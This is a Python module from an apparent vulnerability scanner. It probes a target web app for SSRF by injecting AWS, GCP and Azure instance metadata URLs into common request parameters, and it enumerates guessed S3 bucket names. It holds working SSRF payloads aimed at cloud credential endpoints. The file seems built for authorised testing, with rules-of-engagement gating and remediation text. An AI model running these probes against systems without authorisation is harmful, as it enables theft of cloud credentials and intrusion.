"""Cloud metadata SSRF probe — AWS/GCP/Azure IMDS + S3 bucket enum."""
from __future__ import annotations

import asyncio
from urllib.parse import urlparse

import httpx

from sdk.base import BaseModule, Finding, Phase, Severity, VulnType

try:
    from audit.decorators import audit_logged
    from sdk.decorators import roe_gated
except ImportError:
    def audit_logged(x):
        def dec(f): return f
        return dec
    def roe_gated(x):
        def dec(f): return f
        return dec

IMDS_ENDPOINTS = [
    ("AWS_IPv4", "http://169.254.169.254/latest/meta-data/"),
    ("AWS_IMDSv2_token", "http://169.254.169.254/latest/api/token"),
    ("GCP", "http://metadata.google.internal/computeMetadata/v1/"),
    ("Azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
]

SSRF_PARAMS = [
    "url", "redirect", "next", "target", "dest", "path",
    "image", "src", "fetch", "load", "open", "file", "proxy",
]

CLOUD_KEYWORDS = [
    "ami-id", "instance-id", "project-id", "subscriptionId",
    "instance-type", "local-ipv4", "compute/project", "instanceId",
]

S3_SUFFIXES = ["backup", "data", "static", "assets", "uploads", "dev", "prod", "staging"]


class AWSMetadataSSRFProbe(BaseModule):
    name = "cloud_aws"
    phase = Phase.ACTIVE
    vuln_types = [VulnType.CLOUD_MISCONFIGURATION]  # noqa: RUF012
    author = "swift-core"
    version = "1.0"

    @roe_gated("active_scan")
    @audit_logged("probe_executed")
    async def probe(self, target, session, roe) -> list[Finding]:
        base_url = str(target)
        results = await asyncio.gather(
            self._ssrf_imds(base_url),
            self._s3_enum(base_url),
            return_exceptions=True,
        )
        findings: list[Finding] = []
        for r in results:
            if isinstance(r, list):
                findings.extend(r)
        return findings

    async def _ssrf_imds(self, base_url: str) -> list[Finding]:
        findings: list[Finding] = []
        try:
            async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=False) as client:
                for imds_name, imds_url in IMDS_ENDPOINTS:
                    for param in SSRF_PARAMS:
                        test_url = f"{base_url}?{param}={imds_url}"
                        try:
                            resp = await client.get(test_url)
                            body = resp.text.lower()
                            if any(kw.lower() in body for kw in CLOUD_KEYWORDS):
                                findings.append(Finding(
                                    module=self.name,
                                    vuln_type=VulnType.CLOUD_MISCONFIGURATION,
                                    severity=Severity.CRITICAL,
                                    title=f"SSRF → {imds_name} IMDS via param '{param}'",
                                    description=(
                                        f"Parameter '{param}' fetched {imds_url} and returned cloud metadata. "
                                        f"Attacker can retrieve IAM credentials from {imds_name}."
                                    ),
                                    target_url=base_url,
                                    confidence=0.97,
                                    request_evidence=test_url,
                                    response_evidence=resp.text[:500],
                                    remediation=(
                                        "Block SSRF via allowlist. Enable IMDSv2 (requires PUT token). "
                                        "Restrict outbound to 169.254.169.254 at network level."
                                    ),
                                    oob_confirmed=True,
                                ))
                                return findings
                        except Exception:
                            pass
        except Exception:
            pass
        return findings

    async def _s3_enum(self, base_url: str) -> list[Finding]:
        findings: list[Finding] = []
        try:
            parsed = urlparse(base_url)
            hostname = parsed.netloc.split(":")[0].split(".")
            org_parts = [p for p in hostname if p not in ("www", "com", "org", "net", "io")]
            org = org_parts[0] if org_parts else ""
            if not org:
                return []
            async with httpx.AsyncClient(timeout=8, verify=False) as client:
                for suffix in S3_SUFFIXES:
                    bucket = f"{org}-{suffix}"
                    s3_url = f"https://{bucket}.s3.amazonaws.com/"
                    try:
                        resp = await client.get(s3_url)
                        if resp.status_code in (200, 403):
                            severity = Severity.HIGH if resp.status_code == 200 else Severity.MEDIUM
                            findings.append(Finding(
                                module=self.name,
                                vuln_type=VulnType.CLOUD_MISCONFIGURATION,
                                severity=severity,
                                title=f"S3 bucket found: {bucket} (HTTP {resp.status_code})",
                                description=(
                                    f"S3 bucket '{bucket}' exists. "
                                    f"{'Publicly readable.' if resp.status_code == 200 else 'Exists but access denied.'}"
                                ),
                                target_url=s3_url,
                                confidence=0.96,
                                request_evidence=f"GET {s3_url}",
                                response_evidence=resp.text[:200],
                                remediation="Enable S3 Block Public Access. Enforce bucket policies requiring auth.",
                            ))
                    except Exception:
                        pass
        except Exception:
            pass
        return findings
